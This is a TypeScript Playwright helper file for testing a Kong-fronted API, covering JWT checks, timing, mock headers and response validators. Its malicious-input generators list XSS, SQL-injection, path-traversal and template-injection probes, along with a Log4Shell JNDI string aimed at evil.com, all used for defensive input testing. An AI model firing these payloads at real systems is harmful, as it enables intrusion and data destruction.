// test/playwright/utils/test-helpers.ts

import type { APIRequestContext } from "@playwright/test";
import { expect } from "@playwright/test";
import { ANONYMOUS_CONSUMER } from "../../shared/test-consumers";

export class JWTValidator {
  static validateStructure(token: string) {
    const parts = token.split(".");
    expect(parts).toHaveLength(3);
    return {
      header: JSON.parse(Buffer.from(parts[0], "base64url").toString()),
      payload: JSON.parse(Buffer.from(parts[1], "base64url").toString()),
      signature: parts[2],
    };
  }

  static validateClaims(payload: Record<string, unknown>, expectedClaims: Record<string, unknown>) {
    for (const [key, value] of Object.entries(expectedClaims)) {
      expect(payload).toHaveProperty(key);
      if (value !== undefined) {
        expect(payload[key]).toBe(value);
      }
    }
  }

  static validateExpiration(payload: { exp: number; iat: number }, expectedMinutes: number = 15) {
    const exp = payload.exp;
    const iat = payload.iat;
    expect(exp - iat).toBe(expectedMinutes * 60);

    // Verify token is not expired
    const now = Math.floor(Date.now() / 1000);
    expect(payload.exp).toBeGreaterThan(now);
  }

  static validateRequiredClaims(payload: Record<string, unknown>) {
    const requiredClaims = ["exp", "iat", "iss", "aud", "sub", "key"];
    for (const claim of requiredClaims) {
      expect(payload).toHaveProperty(claim);
      expect(payload[claim]).toBeTruthy();
    }
  }
}

export class PerformanceHelper {
  static async measureResponseTime(fn: () => Promise<unknown>): Promise<number> {
    const start = performance.now();
    await fn();
    const end = performance.now();
    return end - start; // Returns milliseconds
  }

  static calculatePercentile(values: number[], percentile: number): number {
    const sorted = values.sort((a, b) => a - b);
    const index = Math.ceil((percentile / 100) * sorted.length) - 1;
    return sorted[Math.max(0, index)];
  }

  static async measureMultipleRequests(
    request: APIRequestContext,
    endpoint: string,
    headers: Record<string, string> = {},
    count: number = 10
  ): Promise<{ times: number[]; p95: number; p99: number }> {
    const times: number[] = [];

    for (let i = 0; i < count; i++) {
      const start = performance.now();
      await request.get(endpoint, { headers });
      const duration = performance.now() - start;
      times.push(duration);
    }

    return {
      times,
      p95: PerformanceHelper.calculatePercentile(times, 95),
      p99: PerformanceHelper.calculatePercentile(times, 99),
    };
  }
}

export class KongMockHelper {
  static getInvalidConsumerHeaders() {
    return {
      "X-Consumer-Id": "invalid-consumer-id",
      "X-Consumer-Username": "invalid-consumer-username",
    };
  }

  static getAnonymousConsumerHeaders() {
    return {
      "X-Consumer-Id": ANONYMOUS_CONSUMER.id,
      "X-Consumer-Username": ANONYMOUS_CONSUMER.username,
      "X-Anonymous-Consumer": "true",
    };
  }

  static getMalformedHeaders() {
    const malformedVariants = [
      { "X-Consumer-Id": "", "X-Consumer-Username": "test" },
      { "X-Consumer-Id": "test", "X-Consumer-Username": "" },
      { "X-Consumer-Id": null as unknown as string, "X-Consumer-Username": "test" },
      { "X-Consumer-Id": "test", "X-Consumer-Username": undefined as unknown as string },
      { "X-Consumer-Id": '<script>alert("xss")</script>', "X-Consumer-Username": "test" },
      { "X-Consumer-Id": "../../../etc/passwd", "X-Consumer-Username": "test" },
      { "X-Consumer-Id": "test; DROP TABLE consumers;--", "X-Consumer-Username": "test" },
    ];

    return malformedVariants[Math.floor(Math.random() * malformedVariants.length)];
  }
}

export class TestDataGenerator {
  static generateMaliciousInput() {
    const payloads = [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      "'; DROP TABLE consumers;--",
      "../../../etc/passwd",
      // biome-ignore lint/suspicious/noTemplateCurlyInString: Security test payload
      "${jndi:ldap://evil.com/a}",
      "%00",
      "\x00",
      "{{7*7}}",
      // biome-ignore lint/suspicious/noTemplateCurlyInString: Security test payload
      "${7*7}",
      '<img src=x onerror=alert("XSS")>',
    ];

    return payloads[Math.floor(Math.random() * payloads.length)];
  }
}

export class ResponseValidator {
  static validateErrorResponse(
    response: { status(): number } & Record<string, unknown>,
    expectedStatus: number,
    expectedError: string
  ) {
    expect(response.status()).toBe(expectedStatus);
    expect(response).toHaveProperty("error", expectedError);
    expect(response).toHaveProperty("message");
    expect(response).toHaveProperty("timestamp");
    expect(response).toHaveProperty("path");
  }

  static validateHealthResponse(data: Record<string, unknown>) {
    expect(data).toHaveProperty("status");
    expect(data).toHaveProperty("version");
    expect(data).toHaveProperty("timestamp");
    expect(data).toHaveProperty("uptime");
    expect(data).toHaveProperty("dependencies");
    expect(data.dependencies).toHaveProperty("kong");
  }

  static validateMetricsResponse(data: Record<string, unknown>) {
    expect(data).toHaveProperty("timestamp");
    expect(data).toHaveProperty("uptime");
    expect(data).toHaveProperty("memory");
    expect(data.memory).toHaveProperty("used");
    expect(data.memory).toHaveProperty("total");
    expect(data.memory).toHaveProperty("rss");
    expect(data).toHaveProperty("cache");
    expect(data).toHaveProperty("telemetry");
  }

  static validateTokenResponse(data: { access_token: string; expires_in: number }) {
    expect(data).toHaveProperty("access_token");
    expect(data).toHaveProperty("expires_in");
    expect(data.expires_in).toBe(900); // 15 minutes
    expect(typeof data.access_token).toBe("string");
    expect(data.access_token.split(".")).toHaveLength(3);
  }
}

export class WaitHelper {
  static async waitForCondition(
    condition: () => Promise<boolean>,
    timeout: number = 5000,
    interval: number = 100
  ): Promise<void> {
    const startTime = Date.now();

    while (Date.now() - startTime < timeout) {
      if (await condition()) {
        return;
      }
      await new Promise((resolve) => setTimeout(resolve, interval));
    }

    throw new Error(`Condition not met within ${timeout}ms`);
  }

  static async waitForHealthy(request: APIRequestContext, maxAttempts: number = 10): Promise<void> {
    for (let i = 0; i < maxAttempts; i++) {
      try {
        const response = await request.get("/health");
        if (response.ok()) {
          const data = await response.json();
          if (data.status === "healthy") {
            return;
          }
        }
      } catch {
        // Ignore errors and retry
      }

      await new Promise((resolve) => setTimeout(resolve, 1000));
    }

    throw new Error("Service did not become healthy in time");
  }
}

export const customMatchers = {
  toBeValidUUID(received: string) {
    const uuidRegex = /^[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89ab][a-f0-9]{3}-[a-f0-9]{12}$/i;
    const pass = uuidRegex.test(received);
    return {
      pass,
      message: () =>
        pass
          ? `Expected ${received} not to be a valid UUID`
          : `Expected ${received} to be a valid UUID`,
    };
  },

  toBeWithinSLA(received: number, sla: number) {
    const pass = received <= sla;
    return {
      pass,
      message: () =>
        pass
          ? `Expected ${received}ms not to be within SLA of ${sla}ms`
          : `Expected ${received}ms to be within SLA of ${sla}ms`,
    };
  },

  toBeValidJWT(received: string) {
    const parts = received.split(".");
    const pass = parts.length === 3 && parts.every((part) => /^[A-Za-z0-9_-]+$/.test(part));
    return {
      pass,
      message: () =>
        pass
          ? `Expected ${received} not to be a valid JWT`
          : `Expected ${received} to be a valid JWT`,
    };
  },
};
